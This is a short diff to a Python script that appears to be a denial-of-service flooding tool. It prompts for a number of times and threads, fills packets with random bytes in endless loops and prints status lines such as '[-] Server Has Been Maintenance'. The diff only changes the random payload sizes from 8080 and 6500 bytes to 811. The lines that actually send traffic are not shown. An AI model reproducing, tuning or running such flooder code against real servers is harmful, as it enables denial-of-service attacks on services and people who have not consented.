@@ -27,7 +27,7 @@ choice = str(input(" Are You Seriously? (y/n) :"))
 times = int(input(" Times :"))
 threads = int(input(" Threads :"))
 def run():
-	data = random._urandom(8080)
+	data = random._urandom(811)
 	i = random.choice(("[+]","[-]","[=]"))
 	while True:
 		try:
@@ -40,7 +40,7 @@ def run():
 			print("[-] Server Has Been Maintenance")
 
 def run2():
-	data = random._urandom(6500)
+	data = random._urandom(811)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
